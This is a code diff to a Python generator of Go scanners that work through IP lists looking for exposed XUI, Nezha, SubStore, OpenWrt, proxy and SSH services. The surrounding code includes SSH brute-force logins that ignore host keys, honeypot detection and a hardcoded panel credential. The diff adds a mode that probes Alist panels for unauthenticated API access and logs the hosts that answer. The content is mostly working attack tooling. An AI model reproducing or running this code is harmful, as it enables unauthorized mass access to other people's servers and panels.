@@ -406,7 +406,8 @@ func trySSH(ip, port, username, password string) (*ssh.Client, bool, error) {
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 		Timeout:         10 * time.Second,
 	}
-	return ssh.Dial("tcp", addr, config)
+	client, err := ssh.Dial("tcp", addr, config)
+    return client, err == nil, err
 }
 
 func isLikelyHoneypot(client *ssh.Client) bool {
@@ -483,6 +484,7 @@ import (
 	_ "net/http/pprof"
 	"net/url"
 	"os"
+	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
@@ -906,6 +908,151 @@ func main() {
 	wg.Wait()
 }
 '''
+# =========================== ALIST_GO_TEMPLATE (Alist面板) ===========================
+ALIST_GO_TEMPLATE = '''package main
+
+import (
+	"bufio"
+	"context"
+	"crypto/tls"
+	"encoding/json"
+	"fmt"
+	"io"
+	"net"
+	"net/http"
+	"os"
+	"strings"
+	"sync"
+	"sync/atomic"
+	"time"
+)
+
+var completedCount int64
+
+func createHttpClient() *http.Client {
+	tr := &http.Transport{
+		Proxy: http.ProxyFromEnvironment,
+		DialContext: (&net.Dialer{
+			Timeout:   2 * time.Second,
+			KeepAlive: 0,
+		}).DialContext,
+		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
+		TLSHandshakeTimeout:   2 * time.Second,
+		ResponseHeaderTimeout: 2 * time.Second,
+		ExpectContinueTimeout: 1 * time.Second,
+		ForceAttemptHTTP2:     false,
+		DisableKeepAlives:     true,
+	}
+	return &http.Client{
+		Transport: tr,
+		Timeout:   3 * time.Second,
+	}
+}
+
+func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup) {
+	defer wg.Done()
+	httpClient := createHttpClient()
+	for ipPort := range tasks {
+		processIP(ipPort, file, httpClient)
+		atomic.AddInt64(&completedCount, 1)
+	}
+}
+
+func processIP(ipPort string, file *os.File, httpClient *http.Client) {
+	parts := strings.SplitN(ipPort, ":", 2)
+	if len(parts) != 2 {
+		return
+	}
+	ip := strings.TrimSpace(parts[0])
+	port := strings.TrimSpace(parts[1])
+
+	for _, proto := range []string{"http", "https"} {
+		base := fmt.Sprintf("%s://%s:%s", proto, ip, port)
+		testURL := base + "/api/me"
+
+		ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
+		req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
+		if err != nil {
+			cancel()
+			continue
+		}
+		req.Header.Set("User-Agent", "Mozilla/5.0")
+		req.Header.Set("Connection", "close")
+		
+		resp, err := httpClient.Do(req)
+		cancel()
+
+		if err == nil && isValidResponse(resp) {
+			file.WriteString(base + "\\n")
+			return
+		}
+	}
+}
+
+func isValidResponse(resp *http.Response) bool {
+	if resp == nil {
+		return false
+	}
+	defer resp.Body.Close()
+
+	body, err := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
+	if err != nil {
+		return false
+	}
+	var data map[string]interface{}
+	if err := json.Unmarshal(body, &data); err != nil {
+		return false
+	}
+	if v, ok := data["code"]; ok {
+		switch t := v.(type) {
+		case float64:
+			return int(t) == 200
+		case string:
+			return t == "200"
+		}
+	}
+	return false
+}
+
+func main() {
+	inputFile, err := os.Open("results.txt")
+	if err != nil {
+		fmt.Printf("无法读取输入文件: %v\\n", err)
+		return
+	}
+	defer inputFile.Close()
+
+	outputFile, err := os.OpenFile("xui.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		fmt.Println("无法打开输出文件:", err)
+		return
+	}
+	defer outputFile.Close()
+
+	tasks := make(chan string, {semaphore_size})
+	var wg sync.WaitGroup
+
+	for i := 0; i < {semaphore_size}; i++ {
+		wg.Add(1)
+		go worker(tasks, outputFile, &wg)
+	}
+
+	scanner := bufio.NewScanner(inputFile)
+	for scanner.Scan() {
+		line := strings.TrimSpace(scanner.Text())
+		if line != "" {
+			fields := strings.Fields(line)
+			if len(fields) > 0 {
+				tasks <- fields[0]
+			}
+		}
+	}
+
+	close(tasks)
+	wg.Wait()
+	fmt.Println("\\n全部处理完成！")
+}
+'''
 
 # =========================== ipcx.py 内容 (增加tqdm风格进度条) ===========================
 IPCX_PY_CONTENT = r"""import requests
@@ -1143,6 +1290,11 @@ def generate_proxy_go(semaphore_size, auth_mode, proxy_type, timeout, usernames,
                             .replace("{user_list}", user_list) \
                             .replace("{pass_list}", pass_list) \
                             .replace("{creds_list}", creds_list)
+    with open('xui.go', 'w', encoding='utf-8') as f:
+        f.write(code)
+
+def generate_alist_go(semaphore_size, **kwargs):
+    code = ALIST_GO_TEMPLATE.replace("{semaphore_size}", str(semaphore_size))
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
 
@@ -1439,16 +1591,19 @@ def choose_template_mode():
     print("6. SOCKS5 代理")
     print("7. HTTP 代理")
     print("8. HTTPS 代理")
+    print("--- 其他面板 ---")
+    print("9. Alist 面板")
     while True:
-        choice = input("输入 1-8 之间的数字（默认1）：").strip()
+        choice = input("输入 1-9 之间的数字（默认1）：").strip()
         if choice in ("", "1"): return 1
         elif choice == "2": return 2
         elif choice == "3": return 6
         elif choice == "4": return 7
         elif choice == "5": return 8
-        elif choice == "6": return 9 # SOCKS5
-        elif choice == "7": return 10 # HTTP
-        elif choice == "8": return 11 # HTTPS
+        elif choice == "6": return 9   # SOCKS5
+        elif choice == "7": return 10  # HTTP
+        elif choice == "8": return 11  # HTTPS
+        elif choice == "9": return 12  # Alist
         else:
             print("输入无效，请重新输入。")
 
@@ -1580,6 +1735,9 @@ def load_credentials(template_mode, auth_mode=0):
     if template_mode == 7: # Sub Store 模式
         usernames, passwords = ["2cXaAxRGfddmGz2yx1wA"], ["2cXaAxRGfddmGz2yx1wA"]
         return usernames, passwords, credentials
+    
+    if template_mode == 12: # Alist 模式不需要凭据
+        return [], [], []
 
     if auth_mode == 1: # No credentials
         return [], [], []
@@ -1722,6 +1880,7 @@ if __name__ == "__main__":
                     9: (generate_proxy_go, {'proxy_type': 'socks5'}),
                     10: (generate_proxy_go, {'proxy_type': 'http'}),
                     11: (generate_proxy_go, {'proxy_type': 'https'}),
+                    12: (generate_alist_go, {}),
                 }
 
                 gen_func, extra_args = template_map[TEMPLATE_MODE]
@@ -1739,7 +1898,7 @@ if __name__ == "__main__":
 
                 run_ipcx()
                 
-                mode_map = {1: "XUI", 2: "哪吒", 6: "ssh", 7: "substore", 8: "OpenWrt", 9: "SOCKS5", 10: "HTTP", 11: "HTTPS"}
+                mode_map = {1: "XUI", 2: "哪吒", 6: "SSH", 7: "SubStore", 8: "OpenWrt", 9: "SOCKS5", 10: "HTTP", 11: "HTTPS", 12: "Alist"}
                 prefix = mode_map.get(TEMPLATE_MODE, "result")
 
                 if os.path.exists("xui.txt"):
